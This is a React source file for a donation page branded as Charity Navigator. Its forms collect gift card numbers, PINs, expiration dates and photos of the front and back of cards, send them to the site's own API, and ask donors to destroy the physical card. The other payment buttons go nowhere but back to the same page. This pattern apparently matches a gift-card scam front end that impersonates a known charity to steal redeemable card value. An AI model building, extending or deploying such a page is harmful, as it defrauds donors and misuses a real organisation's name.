// ========================================
// Donate.jsx
// ========================================

import { useState } from "react";
import { motion } from "framer-motion";
import ReCAPTCHA from "react-google-recaptcha";
import { useNavigate, Link } from "react-router-dom";

import {
  FaPaypal,
  FaBitcoin,
  FaUniversity,
  FaUpload,
  FaHandHoldingHeart,
} from "react-icons/fa";

import { SiCashapp, SiZelle } from "react-icons/si";
import DonateStats from "./DonateStats";
import { div } from "framer-motion/client";

const RECAPTCHA_SITE_KEY = "6LeoOQUtAAAAAOVKlZ3ezYQBlbvk96u4zTio5mK5";

export default function Donate() {
  const navigate = useNavigate();

  // Manual Gift Card Form
  const [nameManual, setNameManual] = useState("");
  const [emailManual, setEmailManual] = useState("");
  const [giftCardType, setGiftCardType] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [securityCode, setSecurityCode] = useState("");
  const [expiration, setExpiration] = useState("");

  const [captchaTokenManual, setCaptchaTokenManual] = useState(null);

  const [manualLoading, setManualLoading] = useState(false);
  const [manualError, setManualError] = useState("");
  const [manualSuccess, setManualSuccess] = useState("");

  // Upload Form
  const [nameUpload, setNameUpload] = useState("");
  const [emailUpload, setEmailUpload] = useState("");

  const [frontImage, setFrontImage] = useState(null);
  const [backImage, setBackImage] = useState(null);

  const [captchaTokenUpload, setCaptchaTokenUpload] = useState(null);

  const [uploadLoading, setUploadLoading] = useState(false);
  const [uploadError, setUploadError] = useState("");
  const [uploadSuccess, setUploadSuccess] = useState("");

  const handleManualSubmit = async (e) => {
    e.preventDefault();

    setManualError("");
    setManualSuccess("");

    if (!captchaTokenManual) {
      setManualError("Please complete the reCAPTCHA.");
      return;
    }

    setManualLoading(true);

    try {
      const res = await fetch("/api/manual-donation", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          name: nameManual,
          email: emailManual,
          cardType: giftCardType,
          cardNumber,
          amount,
          pin: securityCode,
          expiration,
          captchaToken: captchaTokenManual,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || "Submission failed");
      }

      setManualSuccess("Thank you! Your gift card donation was submitted.");

      setNameManual("");
      setEmailManual("");
      setGiftCardType("");
      setCardNumber("");
      setAmount("");
      setSecurityCode("");
      setExpiration("");
      setCaptchaTokenManual(null);
    } catch (err) {
      setManualError(err.message);
    } finally {
      setManualLoading(false);
    }
  };

  const handleUploadSubmit = async (e) => {
    e.preventDefault();

    setUploadError("");
    setUploadSuccess("");

    if (!captchaTokenUpload) {
      setUploadError("Please complete the reCAPTCHA.");
      return;
    }

    setUploadLoading(true);

    try {
      const formData = new FormData();

      formData.append("name", nameUpload);
      formData.append("email", emailUpload);
      formData.append("frontImage", frontImage);
      formData.append("backImage", backImage);
      formData.append("captchaToken", captchaTokenUpload);

      const res = await fetch("/api/upload-giftcard", {
        method: "POST",
        body: formData,
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || "Upload failed");
      }

      setUploadSuccess("Your card images were submitted successfully.");
      setNameUpload("");
      setEmailUpload("");
      setFrontImage(null);
      setBackImage(null);
      setCaptchaTokenUpload(null);
    } catch (err) {
      setUploadError(err.message);
    } finally {
      setUploadLoading(false);
    }
  };
  return (
    <section>
      <div className="cn-donate">
        <div className="cn-donate-container">
          {/* ================= HEADER ================= */}

          <motion.div
            className="cn-donate-content"
            initial={{ opacity: 0, x: -60 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.7 }}
            viewport={{ once: true }}
          >
            <span className="cn-donate-subtitle">
              Support Charity Navigator
            </span>

            <h2 className="cn-donate-title">
              Help Donors Give With Confidence
            </h2>

            <p className="cn-donate-text">
              Your contribution helps millions of donors discover trusted
              charities, make informed giving decisions, and support causes
              creating meaningful impact worldwide.
            </p>
          </motion.div>

          {/* ================= DONATION FORM ================= */}

          <motion.div
            id="donate"
            className="cn-donate-card"
            initial={{ opacity: 0, y: 60 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
          >
            <div className="cn-card-header">
              <FaHandHoldingHeart />
              <h3>Enter Gift Card Details</h3>
            </div>

            <form onSubmit={handleManualSubmit}>
              <div className="cn-form-grid">
                <input
                  type="text"
                  placeholder="Your Name"
                  value={nameManual}
                  onChange={(e) => setNameManual(e.target.value)}
                  required
                />

                <input
                  type="email"
                  placeholder="Your Email"
                  value={emailManual}
                  onChange={(e) => setEmailManual(e.target.value)}
                  required
                />
              </div>

              <input
                type="text"
                placeholder="Gift Card Type"
                value={giftCardType}
                onChange={(e) => setGiftCardType(e.target.value)}
                required
              />

              <div className="cn-form-grid">
                <input
                  type="text"
                  placeholder="Card Number"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  required
                />

                <input
                  type="text"
                  placeholder="Amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                />
              </div>

              <div className="cn-form-grid">
                <input
                  type="text"
                  placeholder="Security Code / PIN"
                  value={securityCode}
                  onChange={(e) => setSecurityCode(e.target.value)}
                />

                <input
                  type="text"
                  placeholder="Expiration (MM/YY)"
                  value={expiration}
                  onChange={(e) => setExpiration(e.target.value)}
                />
              </div>

              <div className="cn-agreement">
                <label>
                  <input type="checkbox" required />I acknowledge that I am
                  donating this gift card and no goods or services were received
                  in exchange.
                </label>
              </div>

              <ReCAPTCHA
                sitekey={RECAPTCHA_SITE_KEY}
                onChange={setCaptchaTokenManual}
              />

              {manualError && <p className="cn-error">{manualError}</p>}
              {manualSuccess && <p className="cn-success">{manualSuccess}</p>}

              <button
                type="submit"
                className="cn-submit-btn"
                disabled={manualLoading}
              >
                {manualLoading ? "Submitting..." : "Submit Gift Card"}
              </button>
            </form>
          </motion.div>

          {/* ================= UPLOAD ================= */}

          <motion.div
            className="cn-donate-card"
            initial={{ opacity: 0, y: 60 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
          >
            <div className="cn-card-header">
              <FaUpload />
              <h3>Upload Card Images</h3>
            </div>

            <form onSubmit={handleUploadSubmit}>
              <div className="cn-form-grid">
                <input
                  type="text"
                  placeholder="Your Name"
                  value={nameUpload}
                  onChange={(e) => setNameUpload(e.target.value)}
                  required
                />

                <input
                  type="email"
                  placeholder="Your Email"
                  value={emailUpload}
                  onChange={(e) => setEmailUpload(e.target.value)}
                  required
                />
              </div>

              <div className="cn-upload-group">
                <label className="cn-upload-label">Upload Front of Card</label>

                <input
                  type="file"
                  accept="image/*"
                  onChange={(e) => setFrontImage(e.target.files[0])}
                  required
                />
              </div>

              <div className="cn-upload-group">
                <label className="cn-upload-label">Upload Back of Card</label>

                <input
                  type="file"
                  accept="image/*"
                  onChange={(e) => setBackImage(e.target.files[0])}
                  required
                />
              </div>

              <div className="cn-agreement">
                <label>
                  <input type="checkbox" required />I confirm this donation and
                  agree to destroy the physical card after it has been
                  processed.
                </label>
              </div>

              <ReCAPTCHA
                sitekey={RECAPTCHA_SITE_KEY}
                onChange={setCaptchaTokenUpload}
              />

              {uploadError && <p className="cn-error">{uploadError}</p>}
              {uploadSuccess && <p className="cn-success">{uploadSuccess}</p>}

              <button
                type="submit"
                className="cn-submit-btn"
                disabled={uploadLoading}
              >
                {uploadLoading ? "Uploading..." : "Submit Upload"}
              </button>
            </form>
          </motion.div>
          <div className="cn-payment-card">
            <FaBitcoin />
            <h4>Crypto</h4>
            <p>Support through cryptocurrency.</p>

            <Link to="/donate">
              <button>Donate with Crypto</button>
            </Link>
          </div>

          <div className="cn-payment-card">
            <FaPaypal />
            <h4>PayPal</h4>
            <p>Fast and secure online giving.</p>

            <Link to="/donate">
              <button>Donate with PayPal</button>
            </Link>
          </div>

          <div className="cn-payment-card">
            <SiCashapp />
            <h4>Cash App</h4>
            <p>Send support instantly.</p>

            <Link to="/donate">
              <button>Donate with Cash App</button>
            </Link>
          </div>

          <div className="cn-payment-card">
            <SiZelle />
            <h4>Zelle</h4>
            <p>Quick direct transfers.</p>

            <Link to="/donate">
              <button>Donate with Zelle</button>
            </Link>
          </div>

          <div className="cn-wire-card">
            <FaUniversity />
            <h3>Wire Transfer</h3>

            <p>
              Contact our team for secure wire transfer instructions and
              additional information.
            </p>

            <Link to="/donate">
              <button>Request Instructions</button>
            </Link>
          </div>
        </div>
      </div>
      <DonateStats />
    </section>
  );
}
